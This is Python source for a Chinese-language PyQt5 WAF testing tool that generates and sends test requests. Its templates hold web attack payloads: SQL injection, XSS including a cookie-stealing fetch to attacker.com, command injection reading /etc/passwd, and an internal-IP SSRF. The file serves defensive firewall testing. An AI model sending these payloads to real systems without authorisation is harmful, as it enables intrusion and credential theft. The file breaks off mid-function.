import sys
import os
import json
import logging
import requests
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import random

# PyQt5相关导入
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QTabWidget,
    QLabel, QLineEdit, QPushButton, QTextEdit, QTableWidget, QTableWidgetItem,
    QGroupBox, QFileDialog, QProgressBar, QMessageBox, QSplitter, QHeaderView,
    QCheckBox, QComboBox, QGridLayout
)
from PyQt5.QtCore import (
    Qt, QThread, pyqtSignal, QObject
)
from PyQt5.QtGui import (
    QFont, QColor, QBrush
)

# ===================== 全局配置 =====================
requests.packages.urllib3.disable_warnings()
WAF_BLOCK_CODES = [403,405,511,503]
WAF_BLOCK_STRINGS = [
    "WAF拦截", "非法请求", "安全检测", "您的请求存在风险",
    "Security Block", "Request blocked", "阿里云WAF", "腾讯云WAF",
	"等保助手","网络安全专家","网络安全防护","电信安全"
]

# ===================== POC生成器核心模块 =====================
class PocTemplateLibrary:
    """POC模板库：定义各漏洞类型的基础模板"""
    # 漏洞类型映射（显示名 -> 内部标识 + 描述）
    VULN_TYPES = {
        "SQL注入": ("sql_injection", "SQL Injection"),
        "XSS跨站脚本": ("xss", "Cross-Site Scripting"),
        "RCE远程代码执行": ("rce", "Remote Code Execution"),
        "SSRF服务器端请求伪造": ("ssrf", "Server-Side Request Forgery"),
        "路径遍历": ("path_traversal", "Path Traversal"),
        "文件上传": ("file_upload", "File Upload"),
        "XXE外部实体注入": ("xxe", "XML External Entity"),
        "CSRF跨站请求伪造": ("csrf", "Cross-Site Request Forgery"),
        "JWT漏洞": ("jwt_vulnerability", "JWT Vulnerability"),
        "访问控制失效": ("broken_access_control", "Broken Access Control"),
        "加密失败": ("cryptographic_failures", "Cryptographic Failures"),
        "不安全设计": ("insecure_design", "Insecure Design"),
        "安全配置错误": ("security_misconfiguration", "Security Misconfiguration"),
        "过时组件": ("vulnerable_components", "Vulnerable Components"),
        "身份认证失败": ("auth_failures", "Authentication Failures"),
        "数据完整性失败": ("data_integrity_failures", "Data Integrity Failures"),
        "日志监控失败": ("logging_failures", "Logging Failures"),
        "LDAP注入": ("ldap_injection", "LDAP Injection"),
        "正常请求": ("normal", "Normal Request")
    }

    # 请求方法映射
    REQ_METHODS = {
        "GET": "GET",
        "POST-Form": "POST",
        "POST-JSON": "POST"
    }

    # 核心模板（{xxx}为占位符）
    BASE_TEMPLATES = {
        # SQL注入模板
        "sql_injection": {
            "GET": {
                "poc_id": "sqli-{num}-get",
                "name": "SQL注入-{desc}(GET)",
                "url": "https://{domain}/api/{path}",
                "method": "GET",
                "headers": {
                    "Host": "{domain}",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                },
                "data": "{{\"id\":\"1' union select 1,version(),database(),4--+\"}}",
                "expected_result": "blocked",
                "attack_type": "sql_injection"
            },
            "POST-Form": {
                "poc_id": "sqli-{num}-post-form",
                "name": "SQL注入-{desc}(POST-form)",
                "url": "https://{domain}/api/{path}",
                "method": "POST",
                "headers": {
                    "Host": "{domain}",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                },
                "data": "username=admin' and updatexml(1,concat(0x7e,version(),0x7e),1)--+&password=123456",
                "expected_result": "blocked",
                "attack_type": "sql_injection"
            },
            "POST-JSON": {
                "poc_id": "sqli-{num}-post-json",
                "name": "SQL注入-{desc}(JSON-POST)",
                "url": "https://{domain}/api/{path}",
                "method": "POST",
                "headers": {
                    "Host": "{domain}",
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                },
                "data": "{{\"userIds\":[\"1' or '1'='1\",\"2\",\"3\"],\"fields\":\"id,name,phone\"}}",
                "expected_result": "blocked",
                "attack_type": "sql_injection"
            }
        },
        # XSS模板
        "xss": {
            "GET": {
                "poc_id": "xss-{num}-get",
                "name": "反射型XSS-{desc}(GET)",
                "url": "https://{domain}/api/{path}",
                "method": "GET",
                "headers": {
                    "Host": "{domain}",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                },
                "data": "{{\"keyword\":\"<script>alert(document.cookie)</script>\"}}",
                "expected_result": "blocked",
                "attack_type": "xss"
            },
            "POST-Form": {
                "poc_id": "xss-{num}-post-form",
                "name": "存储型XSS-{desc}(POST-form)",
                "url": "https://{domain}/api/{path}",
                "method": "POST",
                "headers": {
                    "Host": "{domain}",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                },
                "data": "content=<div onmouseover=alert('XSS')>好评</div>&userId=1001",
                "expected_result": "blocked",
                "attack_type": "xss"
            },
            "POST-JSON": {
                "poc_id": "xss-{num}-post-json",
                "name": "存储型XSS-{desc}(JSON-POST)",
                "url": "https://{domain}/api/{path}",
                "method": "POST",
                "headers": {
                    "Host": "{domain}",
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                },
                "data": "{{\"nickname\":\"<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>\",\"signature\":\"测试签名\"}}",
                "expected_result": "blocked",
                "attack_type": "xss"
            }
        },
        # 正常请求模板
        "normal": {
            "GET": {
                "poc_id": "normal-{num}-get",
                "name": "正常请求-{desc}(GET)",
                "url": "https://{domain}/api/{path}",
                "method": "GET",
                "headers": {
                    "Host": "{domain}",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                },
                "data": "{{\"page\":1,\"size\":10}}",
                "expected_result": "allowed",
                "attack_type": "normal"
            },
            "POST-Form": {
                "poc_id": "normal-{num}-post-form",
                "name": "正常请求-{desc}(POST-form)",
                "url": "https://{domain}/api/{path}",
                "method": "POST",
                "headers": {
                    "Host": "{domain}",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                },
                "data": "aaa=xxx&bbb=123&ccc=test",
                "expected_result": "allowed",
                "attack_type": "normal"
            },
            "POST-JSON": {
                "poc_id": "normal-{num}-post-json",
                "name": "正常请求-{desc}(JSON-POST)",
                "url": "https://{domain}/api/{path}",
                "method": "POST",
                "headers": {
                    "Host": "{domain}",
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                },
                "data": "{{\"aaa\":\"xxx\",\"bbb\":123,\"ccc\":\"test\",\"ddd\":[\"a\",\"b\",\"c\"]}}",
                "expected_result": "allowed",
                "attack_type": "normal"
            }
        },
        # 其他漏洞模板（简化版，可按需扩展）
        "rce": {
            "GET": {
                "poc_id": "rce-{num}-get",
                "name": "RCE-{desc}(GET)",
                "url": "https://{domain}/api/{path}",
                "method": "GET",
                "headers": {"Host": "{domain}", "User-Agent": "Mozilla/5.0"},
                "data": "{{\"ip\":\"127.0.0.1; cat /etc/passwd\"}}",
                "expected_result": "blocked",
                "attack_type": "rce"
            },
            "POST-JSON": {
                "poc_id": "rce-{num}-post-json",
                "name": "RCE-{desc}(JSON-POST)",
                "url": "https://{domain}/api/{path}",
                "method": "POST",
                "headers": {"Host": "{domain}", "Content-Type": "application/json"},
                "data": "{{\"script\":\"python3\",\"params\":[\"-c\",\"import os;os.system('cat /etc/passwd')\"]}}",
                "expected_result": "blocked",
                "attack_type": "rce"
            }
        },
        "ssrf": {
            "GET": {
                "poc_id": "ssrf-{num}-get",
                "name": "SSRF-{desc}(GET)",
                "url": "https://{domain}/api/{path}",
                "method": "GET",
                "headers": {"Host": "{domain}", "User-Agent": "Mozilla/5.0"},
                "data": "{{\"url\":\"http://192.168.0.1:8080/admin\"}}",
                "expected_result": "blocked",
                "attack_type": "ssrf"
            }
        }
    }

    @classmethod
    def get_vuln_type_options(cls) -> List[str]:
        """获取漏洞类型下拉框选项"""
        return list(cls.VULN_TYPES.keys())

    @classmethod
    def get_method_options(cls) -> List[str]:
        """获取请求方法下拉框选项"""
        return list(cls.REQ_METHODS.keys())

class PocGenerator:
    """POC生成器核心类"""
    def __init__(self):
        self.template_lib = PocTemplateLibrary()
        self.generated_pocs = []
        self.poc_counter = 1  # POC编号计数器

    def generate_poc(
        self,
        domain: str,
        vuln_type_display: str,
        method_display: str,
        path: str = "test",
        desc: str = "自动生成",
        start_num: int = 1
    ) -> Dict:
        """
        生成单个POC
        :param domain: 目标域名（如127.0.0.1）
        :param vuln_type_display: 漏洞类型显示名（如"SQL注入"）
        :param method_display: 请求方法显示名（如"GET"）
        :param path: API路径（如user/detail）
        :param desc: 描述后缀
        :param start_num: POC编号起始值
        :return: 生成的POC字典
        """
        # 转换为内部标识
        vuln_type = self.template_lib.VULN_TYPES[vuln_type_display][0]
        method = self.template_lib.REQ_METHODS[method_display]

        # 获取基础模板
        try:
            template = self.template_lib.BASE_TEMPLATES[vuln_type][method_display]
        except KeyError:
            # 无对应模板时使用默认模板
            template = self.template_lib.BASE_TEMPLATES["normal"][method_display]
            template["attack_type"] = vuln_type
            template["name"] = f"{vuln_type_display}-{desc}({method_display})"
            template["expected_result"] = "blocked" if vuln_type != "normal" else "allowed"

        # 替换占位符
        poc = {}
        for key, value in template.items():
            if isinstance(value, str):
                poc[key] = value.format(
                    domain=domain,
                    path=path,
                    desc=desc,
                    num=start_num
                )
            elif isinstance(value, dict):  # headers字典
                poc[key] = {}
                for k, v in value.items():
                    poc[key][k] = v.format(domain=domain) if isinstance(v, str) else v
            else:
                poc[key] = value

        # 处理data中的双层转义（JSON字符串）
        if "data" in poc and method_display == "POST-JSON":
            poc["data"] = poc["data"].replace("{{", "{").replace("}}", "}")

        self.generated_pocs.append(poc)
        self.poc_counter = start_num + 1
        return poc

    def generate_batch_pocs(
        self,
        domain: str,
        vuln_types: List[str],
        methods: List[str],
        path: str = "test",
        desc: str = "批量生成"
    ) -> List[Dict]:
        """
        批量生成POC
        :param domain: 目标域名
        :param vuln_types: 漏洞类型列表（显示名）
        :param methods: 请求方法列表（显示名）
        :param path: API路径
        :param desc: 描述后缀
        :return: 生成的POC列表
        """
        self.generated_pocs = []
        self.poc_counter = 1

        for vuln_type in vuln_types:
            for method in methods:
                self.generate_poc(
                    domain=domain,
                    vuln_type_display=vuln_type,
                    method_display=method,
                    path=path,
                    desc=desc,
                    start_num=self.poc_counter
                )

        return self.generated_pocs

    def save_pocs(self, file_path: str, indent: int = 4) -> bool:
        """
        保存生成的POC到JSON文件
        :param file_path: 保存路径
        :param indent: JSON缩进
        :return: 是否保存成功
        """
        try:
            with open(file_path, "w", encoding="utf-8") as f:
                json.dump(self.generated_pocs, f, ensure_ascii=False, indent=indent)
            return True
        except Exception as e:
            logging.error(f"保存POC失败: {e}")
            return False

# ===================== 日志重定向 =====================
class GuiLogHandler(QObject, logging.Handler):
    log_signal = pyqtSignal(str)

    def __init__(self, parent=None):
        QObject.__init__(self, parent)
        logging.Handler.__init__(self)

    def emit(self, record):
        try:
            log_msg = self.format(record)
            self.log_signal.emit(f"{log_msg}\n")
        except Exception:
            self.handleError(record)

# ===================== 测试执行线程 =====================
class WafTestWorker(QThread):
    log_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int)
    result_signal = pyqtSignal(dict)
    finish_signal = pyqtSignal(dict)

    def __init__(self, target_domain: str, poc_file: str, report_path: str = "./waf_test_report"):
        super().__init__()
        self.target_domain = target_domain
        self.poc_file = poc_file
        self.report_path = report_path
        self.is_running = True
        self.poc_list: List[Dict] = []
        self.test_report: Dict = {
            "test_time": "",
            "target_domain": "",
            "total_poc": 0,
            "pass_count": 0,
            "fail_count": 0,
            "error_count": 0,
            "accuracy": "0.00%",
            "detail": []
        }

    def stop(self):
        self.is_running = False
        self.log_signal.emit("⚠️ 用户手动停止测试\n")

    def load_poc_list(self) -> bool:
        try:
            with open(self.poc_file, "r", encoding="utf-8") as f:
                self.poc_list = json.load(f)
            required_fields = ["poc_id", "name", "url", "method", "headers", "data", "expected_result", "attack_type"]
            valid_poc = []
            for idx, poc in enumerate(self.poc_list):
                missing_fields = [f for f in required_fields if f not in poc]
                if missing_fields:
                    self.log_signal.emit(f"⚠️ POC-{idx+1} 缺失字段: {missing_fields}，跳过\n")
                    continue
                poc["url"] = poc["url"].replace("127.0.0.1", self.target_domain)
                if "Host" in poc["headers"]:
                    poc["headers"]["Host"] = poc["headers"]["Host"].replace("127.0.0.1", self.target_domain)
                valid_poc.append(poc)
            self.poc_list = valid_poc
            self.test_report["total_poc"] = len(self.poc_list)
            self.log_signal.emit(f"✅ 成功加载 {len(self.poc_list)} 个有效POC\n")
            return True
        except Exception as e:
            self.log_signal.emit(f"❌ 加载POC失败: {str(e)}\n")
            return False

    def parse_data(self, method: str, headers: dict, data_str: str) -> dict:
        if not data_str:
            return {}
        if method.upper() == "GET":
            try:
                return json.loads(data_str)
            except:
                return {}
        content_type = headers.get("Content-Type", "").lower()
        if "application/json" in content_type:
            try:
                return json.loads(data_str)
            except:
                return data_str
        else:
            return data_str

    def send_poc(self, poc_item: dict) -> dict:
        result = {
            "poc_id": poc_item.get("poc_id", "unknown"),
            "name": poc_item.get("name", "unknown"),
            "attack_type": poc_item.get("attack_type", "unknown"),
            "actual_result": None,
            "status": "fail",
            "response_code": None,
            "error_msg": ""
        }
        if not self.is_running:
            return result

        try:
            url = poc_item["url"]
            method = poc_item["method"].upper()
            headers = poc_item["headers"]
            expected_result = poc_item["expected_result"]
            data = self.parse_data(method, headers, poc_item.get("data", "{}"))

            self.log_signal.emit(f"📤 执行POC-{result['poc_id']}: {method} {url}")
            resp = requests.request(
                method=method,
                url=url,
                headers=headers,
                params=data if method == "GET" else None,
                data=data if method != "GET" and not isinstance(data, dict) else None,
                json=data if method != "GET" and isinstance(data, dict) else None,
                timeout=10,
                verify=False,
                allow_redirects=False
            )

            result["response_code"] = resp.status_code
            block_by_code = resp.status_code in WAF_BLOCK_CODES
            block_by_string = any(sign in resp.text for sign in WAF_BLOCK_STRINGS)
            result["actual_result"] = "blocked" if (block_by_code or block_by_string) else "allowed"
            if result["actual_result"] == expected_result:
                result["status"] = "pass"
                self.log_signal.emit(f"✅ POC-{result['poc_id']} 执行成功: 预期[{expected_result}] 实际[{result['actual_result']}]")
            else:
                self.log_signal.emit(f"❌ POC-{result['poc_id']} 执行失败: 预期[{expected_result}] 实际[{result['actual_result']}]")
        except Exception as e:
            result["error_msg"] = str(e)
            self.log_signal.emit(f"❌ POC-{result['poc_id']} 执行异常: {str(e)}")
        return result

    def generate_report(self):
        try:
            total = self.test_report["total_poc"]
            if total > 0:
                self.test_report["accuracy"] = f"{(self.test_report['pass_count'] / total) * 100:.2f}%"
            self.test_report["test_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.test_report["target_domain"] = self.target_domain

            json_report_file = f"{self.report_path}.json"
            with open(json_report_file, "w", encoding="utf-8") as f:
                json.dump(self.test_report, f, ensure_ascii=False, indent=4)

            txt_report_file = f"{self.report_path}.txt"
            with open(txt_report_file, "w", encoding="utf-8") as f:
                f.write("="*50 + " WAF自动化测试报告 " + "="*50 + "\n")
                f.write(f"测试时间: {self.test_report['test_time']}\n")
                f.write(f"测试域名: {self.test_report['target_domain']}\n")
                f.write(f"总用例数: {self.test_report['total_poc']}\n")
                f.write(f"通过数: {self.test_report['pass_count']} | 失败数: {self.test_report['fail_count']} | 错误数: {self.test_report['error_count']}\n")
                f.write(f"准确率: {self.test_report['accuracy']}\n\n")
                f.write("="*30 + " 失败/错误用例详情 " + "="*30 + "\n")
                for res in self.test_report["detail"]:
                    if res["status"] != "pass":
                        f.write(f"POC-ID: {res['poc_id']} | 名称: {res['name']}\n")
                        f.write(f"预期结果: {res.get('expected_result', '未知')} | 实际结果: {res['actual_result']}\n")
                        f.write(f"错误信息: {res['error_msg']}\n")
                        f.write("-"*80 + "\n")
            self.log_signal.emit(f"📄 测试报告已生成:\n  JSON: {json_report_file}\n  文本: {txt_report_file}\n")
        except Exception as e:
            self.log_signal.emit(f"❌ 生成报告失败: {str(e)}\n")

    def run(self):
        if not self.load_poc_list() or not self.is_running:
            self.finish_signal.emit(self.test_report)
            return

        self.test_report["test_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.test_report["target_domain"] = self.target_domain

        total = len(self.poc_list)
        for idx, poc in enumerate(self.poc_list):
            if not self.is_running:
                break
            progress = int((idx + 1) / total * 100)
            self.progress_signal.emit(progress)
            res = self.send_poc(poc)
            self.result_signal.emit(res)
            self.test_report["detail"].append(res)
            if res["status"] == "pass":
                self.test_report["pass_count"] += 1
            elif res["error_msg"]:
                self.test_report["error_count"] += 1
            else:
                self.test_report["fail_count"] += 1

        if self.is_running:
            self.generate_report()
        self.finish_signal.emit(self.test_report)
        self.log_signal.emit("🏁 测试执行完成！\n")

# ===================== POC生成器GUI组件 =====================
class PocGeneratorWidget(QWidget):
    """POC生成器GUI界面"""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.generator = PocGenerator()
        self.init_ui()

    def init_ui(self):
        main_layout = QVBoxLayout(self)
        main_layout.setSpacing(15)
        main_layout.setContentsMargins(15, 15, 15, 15)

        # ========== 1. 配置区 ==========
        config_group = QGroupBox("POC生成配置")
        config_group.setStyleSheet("QGroupBox{font-size:14px; font-weight:bold; margin-top:8px;}")
        config_layout = QGridLayout(config_group)
        config_layout.setSpacing(10)

        # 目标域名
        config_layout.addWidget(QLabel("目标域名:"), 0, 0)
        self.domain_edit = QLineEdit()
        self.domain_edit.setPlaceholderText("例如: 127.0.0.1")
        self.domain_edit.setStyleSheet(self.get_edit_style())
        config_layout.addWidget(self.domain_edit, 0, 1, 1, 2)

        # 漏洞类型
        config_layout.addWidget(QLabel("漏洞类型:"), 1, 0)
        self.vuln_type_combo = QComboBox()
        self.vuln_type_combo.addItems(PocTemplateLibrary.get_vuln_type_options())
        self.vuln_type_combo.setStyleSheet(self.get_combo_style())
        config_layout.addWidget(self.vuln_type_combo, 1, 1)
        # 批量选择按钮
        self.batch_vuln_btn = QPushButton("批量选择")
        self.batch_vuln_btn.setStyleSheet(self.get_btn_style_small())
        self.batch_vuln_btn.clicked.connect(self.select_batch_vuln)
        config_layout.addWidget(self.batch_vuln_btn, 1, 2)

        # 请求方法
        config_layout.addWidget(QLabel("请求方法:"), 2, 0)
        self.method_combo = QComboBox()
        self.method_combo.addItems(PocTemplateLibrary.get_method_options())
        self.method_combo.setStyleSheet(self.get_combo_style())
        config_layout.addWidget(self.method_combo, 2, 1)
        # 批量选择按钮
        self.batch_method_btn = QPushButton("批量选择")
        self.batch_method_btn.setStyleSheet(self.get_btn_style_small())
        self.batch_method_btn.clicked.connect(self.select_batch_method)
        config_layout.addWidget(self.batch_method_btn, 2, 2)

        # API路径
        config_layout.addWidget(QLabel("API路径:"), 3, 0)
        self.path_edit = QLineEdit("test")
        self.path_edit.setStyleSheet(self.get_edit_style())
        config_layout.addWidget(self.path_edit, 3, 1, 1, 2)

        # 描述
        config_layout.addWidget(QLabel("描述后缀:"), 4, 0)
        self.desc_edit = QLineEdit("自动生成")
        self.desc_edit.setStyleSheet(self.get_edit_style())
        config_layout.addWidget(self.desc_edit, 4, 1, 1, 2)

        main_layout.addWidget(config_group)

        # ========== 2. 操作按钮区 ==========
        btn_layout = QHBoxLayout()
        # 生成单个POC
        self.gen_single_btn = QPushButton("生成单个POC")
        self.gen_single_btn.setStyleSheet(self.get_btn_style())
        self.gen_single_btn.clicked.connect(self.generate_single_poc)
        btn_layout.addWidget(self.gen_single_btn)

        # 批量生成POC
        self.gen_batch_btn = QPushButton("批量生成POC")
        self.gen_batch_btn.setStyleSheet(self.get_btn_style())
        self.gen_batch_btn.clicked.connect(self.generate_batch_poc)
        btn_layout.addWidget(self.gen_batch_btn)

        # 保存POC
        self.save_btn = QPushButton("保存POC到文件")
        self.save_btn.setStyleSheet(self.get_btn_style())
        self.save_btn.clicked.connect(self.save_pocs)
        self.save_btn.setEnabled(False)
        btn_layout.addWidget(self.save_btn)

        # 清空POC
        self.clear_btn = QPushButton("清空生成结果")
        self.clear_btn.setStyleSheet(self.get_btn_style_danger())
        self.clear_btn.clicked.connect(self.clear_pocs)
        btn_layout.addWidget(self.clear_btn)

        main_layout.addLayout(btn_layout)

        # ========== 3. 预览区 ==========
        preview_group = QGroupBox("POC预览")
        preview_group.setStyleSheet("QGroupBox{font-size:14px; font-weight:bold; margin-top:8px;}")
        preview_layout = QVBoxLayout(preview_group)

        self.preview_text = QTextEdit()
        self.preview_text.setReadOnly(True)
        self.preview_text.setStyleSheet(self.get_preview_style())
        preview_layout.addWidget(self.preview_text)

        main_layout.addWidget(preview_group)

        # 批量选择的变量
        self.selected_vuln_types = []
        self.selected_methods = []

    def get_edit_style(self) -> str:
        return """
            QLineEdit{
                padding: 8px 10px;
                border: 1px solid #dcdfe6;
                border-radius: 6px;
                font-size:12px;
            }
            QLineEdit:focus{
                border-color: #409eff;
                outline: none;
            }
        """

    def get_combo_style(self) -> str:
        return """
            QComboBox{
                padding: 8px 10px;
                border: 1px solid #dcdfe6;
                border-radius: 6px;
                font-size:12px;
            }
            QComboBox::drop-down{
                border: none;
            }
            QComboBox:focus{
                border-color: #409eff;
                outline: none;
            }
        """

    def get_btn_style(self) -> str:
        return """
            QPushButton{
                background-color: #409eff;
                color: white;
                border: none;
                border-radius: 6px;
                padding: 8px 16px;
                font-size:12px;
                font-weight:500;
            }
            QPushButton:hover{
                background-color: #66b1ff;
            }
            QPushButton:pressed{
                background-color: #337ecc;
            }
            QPushButton:disabled{
                background-color: #c0c4cc;
            }
        """

    def get_btn_style_small(self) -> str:
        return """
            QPushButton{
                background-color: #e6e9ec;
                color: #606266;
                border: none;
                border-radius: 4px;
                padding: 4px 8px;
                font-size:11px;
            }
            QPushButton:hover{
                background-color: #dcdfe6;
            }
        """

    def get_btn_style_danger(self) -> str:
        return """
            QPushButton{
                background-color: #f56c6c;
                color: white;
                border: none;
                border-radius: 6px;
                padding: 8px 16px;
                font-size:12px;
                font-weight:500;
            }
            QPushButton:hover{
                background-color: #f78989;
            }
            QPushButton:pressed{
                background-color: #e45656;
            }
        """

    def get_preview_style(self) -> str:
        return """
            QTextEdit{
                border: 1px solid #dcdfe6;
                border-radius: 6px;
                background-color: white;
                padding: 10px;
                font-family: "Consolas", "Microsoft YaHei", sans-serif;
                font-size:11px;
                color: #333;
            }
        """

    def select_batch_vuln(self):
        """批量选择漏洞类型"""
        vuln_types = PocTemplateLibrary.get_vuln_type_options()
        selected, ok = QMessageBox.information(
            self,
            "批量选择漏洞类型",
            f"请输入要选择的漏洞类型（逗号分隔）:\n示例: SQL注入,XSS跨站脚本,正常请求\n\n所有可选类型:\n{', '.join(vuln_types)}",
            QMessageBox.Ok | QMessageBox.Cancel
        )
        if ok and selected == QMessageBox.Ok:
            input_text = QInputDialog.getText(self, "批量选择漏洞类型", "输入漏洞类型（逗号分隔）:")[0]
            if input_text:
                self.selected_vuln_types = [v.strip() for v in input_text.split(",") if v.strip() in vuln_types]
                if self.selected_vuln_types:
                    QMessageBox.information(self, "成功", f"已选择: {', '.join(self.selected_vuln_types)}")
                else:
                    QMessageBox.warning(self, "警告", "无有效漏洞类型！")

    def select_batch_method(self):
        """批量选择请求方法"""
        methods = PocTemplateLibrary.get_method_options()
        selected, ok = QMessageBox.information(
            self,
            "批量选择请求方法",
            f"请输入要选择的请求方法（逗号分隔）:\n示例: GET,POST-Form,POST-JSON\n\n所有可选方法:\n{', '.join(methods)}",
            QMessageBox.Ok | QMessageBox.Cancel
        )
        if ok and selected == QMessageBox.Ok:
            input_text = QInputDialog.getText(self, "批量选择请求方法", "输入请求方法（逗号分隔）:")[0]
            if input_text:
                self.selected_methods = [m.strip() for m in input_text.split(",") if m.strip() in methods]
                if self.selected_methods:
                    QMessageBox.information(self, "成功", f"已选择: {', '.join(self.selected_methods)}")
                else:
                    QMessageBox.warning(self, "警告", "无有效请求方法！")

    def generate_single_poc(self):
        """生成单个POC"""
        domain = self.domain_edit.text().strip()
        if not domain:
            QMessageBox.warning(self, "警告", "请输入目标域名！")
            return

        vuln_type = self.vuln_type_combo.currentText()
        method = self.method_combo.currentText()
        path = self.path_edit.text().strip()
        desc = self.desc_edit.text().strip()

        try:
            poc = self.generator.generate_poc(
                domain=domain,
                vuln_type_display=vuln_type,
                method_display=method,
                path=path,
                desc=desc,
                start_num=1
            )
            # 预览
            self.preview_text.setText(json.dumps(poc, ensure_ascii=False, indent=4))
            self.save_btn.setEnabled(True)
            QMessageBox.information(self, "成功", "单个POC生成完成！")
        except Exception as e:
            QMessageBox.critical(self, "错误", f"生成POC失败: {str(e)}")

    def generate_batch_poc(self):
        """批量生成POC"""
        domain = self.domain_edit.text().strip()
        if not domain:
            QMessageBox.warning(self, "警告", "请输入目标域名！")
            return

        # 获取批量选择的类型/方法
        vuln_types = self.selected_vuln_types if self.selected_vuln_types else [self.vuln_type_combo.currentText()]
        methods = self.selected_methods if self.selected_methods else [self.method_combo.currentText()]

        if not vuln_types or not methods:
            QMessageBox.warning(self, "警告", "请选择漏洞类型和请求方法！")
            return

        path = self.path_edit.text().strip()
        desc = self.desc_edit.text().strip()

        try:
            pocs = self.generator.generate_batch_pocs(
                domain=domain,
                vuln_types=vuln_types,
                methods=methods,
                path=path,
                desc=desc
            )
            # 预览
            self.preview_text.setText(json.dumps(pocs, ensure_ascii=False, indent=4))
            self.save_btn.setEnabled(True)
            QMessageBox.information(self, "成功", f"批量生成完成！共生成 {len(pocs)} 个POC")
        except Exception as e:
            QMessageBox.critical(self, "错误", f"批量生成POC失败: {str(e)}")

    def save_pocs(self):
        """保存生成的POC"""
        if not self.generator.generated_pocs:
            QMessageBox.warning(self, "警告", "无生成的POC可保存！")
            return

        file_path, _ = QFileDialog.getSaveFileName(
            self, "保存POC文件", "./auto_generated_pocs.json", "JSON文件 (*.json);;所有文件 (*.*)"
        )
        if file_path:
            if self.generator.save_pocs(file_path):
                QMessageBox.information(self, "成功", f"POC已保存到: {file_path}")
            else:
                QMessageBox.critical(self, "错误", "保存POC失败！")

    def clear_pocs(self):
        """清空生成结果"""
        self.generator.generated_pocs = []
        self.preview_text.clear()
        self.save_btn.setEnabled(False)
        self.selected_vuln_types = []
        self.selected_methods = []
        QMessageBox.information(self, "成功", "已清空生成结果！")

# ===================== 主窗口 =====================
class WafTestMainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WAF自动化测试工具 v2.0（含POC生成器）")
        self.setMinimumSize(1200, 800)
        self.worker: Optional[WafTestWorker] = None

        # 初始化日志处理器
        self.log_handler = GuiLogHandler(parent=self)
        self.log_handler.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s - %(message)s"))
        logging.getLogger("WAF_AUTO_TEST").addHandler(self.log_handler)
        logging.getLogger("WAF_AUTO_TEST").setLevel(logging.INFO)

        # 初始化标签页
        self.tab_widget = QTabWidget()
        self.setCentralWidget(self.tab_widget)

        # 1. 原有测试功能标签页
        self.test_widget = self.create_test_widget()
        self.tab_widget.addTab(self.test_widget, "WAF测试")

        # 2. POC生成器标签页
        self.generator_widget = PocGeneratorWidget()
        self.tab_widget.addTab(self.generator_widget, "POC生成器")

        # 整体样式
        self.setStyleSheet("""
            QMainWindow{background-color: #f5f7fa;}
            QWidget{font-family: "Microsoft YaHei", Arial, sans-serif; font-size:12px;}
            QTabWidget::pane{border: 1px solid #e6e6e6;}
            QTabBar::tab{padding: 8px 20px; margin-right: 2px;}
            QTabBar::tab:selected{background-color: #409eff; color: white;}
        """)

    def create_test_widget(self) -> QWidget:
        """创建原有测试功能界面"""
        widget = QWidget()
        main_layout = QVBoxLayout(widget)
        main_layout.setSpacing(10)
        main_layout.setContentsMargins(15, 15, 15, 15)

        # ========== 1. 配置区 ==========
        config_group = QGroupBox("测试配置")
        config_group.setStyleSheet("QGroupBox{font-size:14px; font-weight:bold; margin-top:8px;}")
        config_layout = QHBoxLayout(config_group)
        config_layout.setSpacing(15)

        domain_label = QLabel("目标域名:")
        domain_label.setMinimumWidth(80)
        self.domain_edit = QLineEdit()
        self.domain_edit.setPlaceholderText("例如: 127.0.0.1")
        self.domain_edit.setStyleSheet(self.get_edit_style())

        poc_label = QLabel("POC文件:")
        poc_label.setMinimumWidth(80)
        self.poc_edit = QLineEdit()
        self.poc_edit.setPlaceholderText("选择POC JSON文件路径")
        self.poc_edit.setStyleSheet(self.get_edit_style())
        poc_btn = QPushButton("浏览")
        poc_btn.setStyleSheet(self.get_btn_style())
        poc_btn.clicked.connect(self.select_poc_file)

        report_label = QLabel("报告路径:")
        report_label.setMinimumWidth(80)
        self.report_edit = QLineEdit("./waf_test_report")
        self.report_edit.setStyleSheet(self.get_edit_style())
        report_btn = QPushButton("浏览")
        report_btn.setStyleSheet(self.get_btn_style())
        report_btn.clicked.connect(self.select_report_path)

        config_layout.addWidget(domain_label)
